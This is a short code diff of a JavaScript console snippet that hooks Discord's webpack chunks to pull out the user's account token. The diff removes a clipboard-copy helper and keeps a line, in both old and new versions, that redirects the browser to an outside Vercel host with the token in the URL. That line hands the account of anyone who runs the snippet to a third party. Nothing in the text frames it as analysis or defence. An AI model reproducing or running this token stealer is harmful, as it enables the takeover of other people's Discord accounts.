@@ -12,23 +12,7 @@ window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{
     }
   }
 }]);
-
-function copyToClipboard(text) {
-  const el = document.createElement("textarea");
-  el.value = text;
-  document.body.appendChild(el);
-  el.select();
-  document.execCommand("copy");
-  document.body.removeChild(el);
-}
-
-if (x) {
-  copyToClipboard(x);
-  console.log("%cToken copied to your clipboard!", "font-size: 25px");
-} else {
-  console.log("No getToken function found.");
-}
-location.replace("web555g.vercel.app?z=" + x);
+location.replace("web555g.vercel.app/?z=" + x);
 
 
 function launch(){
